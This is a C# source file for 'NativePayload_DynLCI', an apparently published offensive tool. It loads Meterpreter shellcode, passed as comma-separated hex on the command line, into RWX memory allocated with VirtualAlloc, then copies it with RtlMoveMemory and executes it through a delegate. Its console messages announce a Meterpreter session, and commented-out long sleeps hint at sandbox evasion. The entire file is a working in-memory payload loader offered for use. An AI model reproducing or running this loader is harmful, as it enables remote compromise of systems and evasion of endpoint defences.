using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Text;

namespace NativePayload_DynLCI
{
    class Program
    {
        [Flags]
        public enum AllocationType
        {
            Commit = 0x00001000,
        }

        [Flags]
        public enum MemoryProtection
        {
            ExecuteReadWrite = 0x0040,

        }

        [DllImport("kernelbase.dll")]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, AllocationType flAllocationType, MemoryProtection flProtect);
        [DllImport("ntdll.dll")]
        private static extern bool RtlMoveMemory(IntPtr addr, byte[] pay, uint size);

        private delegate float Execute_In_Memory();
        private static IntPtr _ResultVA = IntPtr.Zero;

        static void Main(string[] args)
        {
            try
            {
                /// .Net Framework 2.0 ;)

                Console.WriteLine();
                Console.ForegroundColor = ConsoleColor.DarkGray;
                Console.WriteLine("NativePayload_DynLCI , Published by Damon Mohammadbagher , 2018-2019");
                Console.ForegroundColor = ConsoleColor.Gray;
                Console.WriteLine("NativePayload_DynLCI , Dynamic Local Code Invoke , Injecting Meterpreter Payload bytes into local Process");
                Console.WriteLine();

                string[] X = args[0].Split(',');
                byte[] Xpayload = new byte[X.Length];

                for (int i = 0; i < X.Length;) { Xpayload[i] = Convert.ToByte(X[i], 16); i++; }

                //System.Threading.Thread.Sleep(60000);
                _ResultVA = VirtualAlloc(IntPtr.Zero, (uint)Xpayload.Length, AllocationType.Commit, MemoryProtection.ExecuteReadWrite);

                //System.Threading.Thread.Sleep(60000);
                RtlMoveMemory(_ResultVA, Xpayload, (uint)Xpayload.Length);

                System.Threading.Thread.Sleep(200);
                object obj = (Execute_In_Memory)Marshal.GetDelegateForFunctionPointer(_ResultVA, typeof(Execute_In_Memory)).Clone();

                Console.WriteLine();
                Console.ForegroundColor = ConsoleColor.Gray;
                Console.WriteLine("Bingo Meterpreter Session by Dynamic Local Code Invoke Method  ;)");
                Console.WriteLine();

                System.Threading.Thread.Sleep(25);
                object result = ((Execute_In_Memory)obj).DynamicInvoke(null).GetType();

                Marshal.FreeHGlobal(_ResultVA);

                _ResultVA = IntPtr.Zero;

            }
            catch
            {

            }
        }
    }
}
